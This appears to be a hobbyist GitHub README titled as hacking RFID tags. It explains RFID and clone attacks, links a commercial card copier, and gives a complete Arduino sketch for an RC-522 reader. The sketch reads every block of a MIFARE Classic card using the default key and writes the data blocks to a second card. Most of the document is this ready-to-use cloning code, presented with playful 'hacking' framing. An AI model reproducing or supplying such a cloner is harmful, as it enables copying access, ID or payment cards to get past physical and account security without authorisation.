# Hacking_MCHKLT_project
# Hacking RFID tags From MCHKLT article

<img src="https://www.icegif.com/wp-content/uploads/evil-laugh-icegif-14.gif" height="500" weidth="800">

## Eddi3 said " i wish if someone could hack the RFID tags mentioned in the article" So here i am Mr eddie

# What is RFID or (Radio Frequency Identificators)

RFID (radio frequency identification) is a form of wireless communication that incorporates the use of electromagnetic or electrostatic Fields in the radio frequency portion of the electromagnetic spectrum to uniquely identify an object, animal or person.

# How does the RFID works ?
Every RFID system consists of three components: a scanning antenna, a transceiver and a transponder. When the scanning antenna and transceiver are combined, they are referred to as an RFID reader or interrogator. There are two types of RFID readers -- fixed readers and mobile readers. The RFID reader is a network-connected device that can be portable or permanently attached. It uses radio waves to transmit signals that activate the tag. Once activated, the tag sends a wave back to the antenna, where it is translated into data.

<img src="https://media.giphy.com/media/NBcdUXviLgfq8/giphy.gif">

# What is RFID **CLONING** ?

**A clone attack refers to the copying of information of an RFID electronic tag or smart card to a clone tag, which will then have the same characteristics as the original tag, and can replace it.**

## Here is a schematic explaining how cloning attacks work :

<img src="https://www.researchgate.net/publication/340648748/figure/fig12/AS:962229457416216@1606424788830/RFID-system-model-with-cloning-attack-and-detection-22.png">

# One of the most known RFID cloning device are The ASHATA RFID Card Copier

<img src="https://m.media-amazon.com/images/S/aplus-media-library-service-media/90819ef8-f2e3-4398-8ca3-373e2f4fa9ca.__CR0,0,1601,1601_PT0_SX300_V1___.jpg">

<a href="https://www.amazon.com/ASHATA-Handheld-Duplicator-Cloning-Writable/dp/B07YFN46N9"> <h1>Buy it Here </a>

# Now let's make our own RFID cloner

## Hardware needed :
- RFID reader RC-522
- ARDUINO UNO
- Some wires
- Computer 

# let's assembel our RFID cloner 

<img src="https://www.b4x.com/android/forum/attachments/arduino_uno_rfid_rc522-jpg.43297/">

# Upload the C code to our Arduino 
```cpp
byte data[64][16];
int count = 0;
int initial = 0;
int state = 0;
#include <SPI.h>
#include <MFRC522.h>
#define SS_PIN 10  
#define RST_PIN 5  
MFRC522 mfrc522(SS_PIN, RST_PIN);        
MFRC522::MIFARE_Key key;
void setup() {
        Serial.begin(9600);        
        SPI.begin();               
        mfrc522.PCD_Init();        
        Serial.println("Scan a MIFARE Classic card");
        for (byte i = 0; i < 6; i++) {
                key.keyByte[i] = 0xFF;
        }
}                         
byte readbackblock[18];
void loop()  
{  
  if(state == 0){ 
    if ( ! mfrc522.PICC_IsNewCardPresent()) {
      return;
    }
    if ( ! mfrc522.PICC_ReadCardSerial()) {
      return;
    }       
    Serial.println("Card selected, reading and saving data...");
    if (initial == 0)
    {
      for (int i = 0; i<64; i++)
      {
        readBlock(i, readbackblock);
        for (int j=0 ; j<16 ; j++)
        {
          data[i][j] =  readbackblock[j];
        }
      }
     }
    initial++;
    state++;
    mfrc522.PICC_DumpToSerial(&(mfrc522.uid));
    Serial.println("Place card to clone now");
    delay(5000);
  }
  else if(state == 1){
    if ( ! mfrc522.PICC_IsNewCardPresent()) {
      return;
    }
    if ( ! mfrc522.PICC_ReadCardSerial()) {
      return;
    }    
    if (initial == 1 && count == 0)
    {
      for (int f = 1; f < 64; f++)
      {
        if ((f % 4) != 3)
        {
          writeBlock(f, data[f]);
          Serial.println("block written");
        }
      }
      count ++;
    }
    Serial.println("Cloning finished");
    state--;
  }
}
int writeBlock(int blockNumber, byte arrayAddress[]) 
{
  int largestModulo4Number=blockNumber/4*4;
  int trailerBlock=largestModulo4Number+3;
  if (blockNumber > 2 && (blockNumber+1)%4 == 0){Serial.print(blockNumber);Serial.println(" is a trailer block:");return 2;}
  Serial.print(blockNumber);
  Serial.println(" is a data block:");
  byte status = mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, trailerBlock, &key, &(mfrc522.uid));
  if (status != MFRC522::STATUS_OK) {
         Serial.print("PCD_Authenticate() failed: ");
         Serial.println(mfrc522.GetStatusCodeName(status));
         return 3;
  }
  status = mfrc522.MIFARE_Write(blockNumber, arrayAddress, 16);
  if (status != MFRC522::STATUS_OK) {
           Serial.print("MIFARE_Write() failed: ");
           Serial.println(mfrc522.GetStatusCodeName(status));
           return 4;
  }
  Serial.println("Block was written");
}
int readBlock(int blockNumber, byte arrayAddress[]) 
{
  int largestModulo4Number=blockNumber/4*4;
  int trailerBlock=largestModulo4Number+3;
  byte status = mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, trailerBlock, &key, &(mfrc522.uid));
  if (status != MFRC522::STATUS_OK) {
         Serial.print("PCD_Authenticate() failed (read): ");
         Serial.println(mfrc522.GetStatusCodeName(status));
         return 3;
  }     
  byte buffersize = 18;
  status = mfrc522.MIFARE_Read(blockNumber, arrayAddress, &buffersize);
  if (status != MFRC522::STATUS_OK) {
          Serial.print("MIFARE_read() failed: ");
          Serial.println(mfrc522.GetStatusCodeName(status));
          return 4;
  }
  Serial.println("Block was read");
}


```
# Thanks For Reading 
# Thanks to MCHKLT
